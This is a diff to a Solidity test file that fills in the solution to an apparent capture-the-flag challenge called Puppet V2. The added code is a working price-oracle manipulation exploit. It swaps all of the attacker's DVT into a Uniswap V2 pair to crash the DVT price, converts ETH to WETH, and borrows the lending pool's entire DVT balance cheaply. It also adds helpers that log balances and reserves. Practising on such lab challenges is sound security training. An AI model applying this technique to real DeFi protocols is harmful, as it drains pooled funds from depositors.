@@ -98,15 +98,35 @@ contract PuppetV2 is Test {
 
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
+    
+    function _printBalances(string memory name,address a) internal view{
+        console.log(name,"weth balance:", weth.balanceOf(a));
+        console.log(name,"dvt balance:", dvt.balanceOf(a));
+    }
+
+    function _printReserves() internal view{
+        (uint112 r0, uint112 r1,)= uniswapV2Pair.getReserves();
+        console.log("reserve dvt",r0);
+        console.log("reserve weth",r1);
+    }
+    function _swapTokens4Tokens() internal{
+        address[] memory path = new address[](2);
+        path[0] = address(dvt);
+        path[1] = address(weth);
+        dvt.approve(address(uniswapV2Router), type(uint256).max);
+        uniswapV2Router.swapExactTokensForTokens(
+                dvt.balanceOf(attacker),0, path,
+                attacker,block.timestamp);
+    }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
-
-        /**
-         * EXPLOIT END *
-         */
+        vm.startPrank(attacker);
+        _swapTokens4Tokens();
+        uint256 victimBalance = dvt.balanceOf(address(puppetV2Pool));
+        weth.approve(address(puppetV2Pool), type(uint256).max);
+        weth.deposit{value: attacker.balance}();
+        puppetV2Pool.borrow(victimBalance);
+        vm.stopPrank();
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
